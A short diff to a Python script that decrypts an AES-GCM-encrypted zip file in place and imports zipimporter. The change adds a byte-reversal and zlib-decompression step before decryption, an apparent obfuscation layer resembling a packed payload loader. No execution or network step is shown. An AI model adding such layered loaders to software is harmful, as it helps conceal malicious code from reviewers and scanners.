@@ -1,4 +1,4 @@
-import os, sys, base64
+import os, sys, base64, zlib
 from pyaes import AESModeOfOperationGCM
 from zipimport import zipimporter
 
@@ -14,6 +14,7 @@ def decrypt(key, iv, ciphertext):
 if os.path.isfile(zipfile):
     with open(zipfile, "rb") as f:
         ciphertext = f.read()
+    ciphertext = zlib.decompress(ciphertext[::-1])
     decrypted = decrypt(key, iv, ciphertext)
     with open(zipfile, "wb") as f:
         f.write(decrypted)
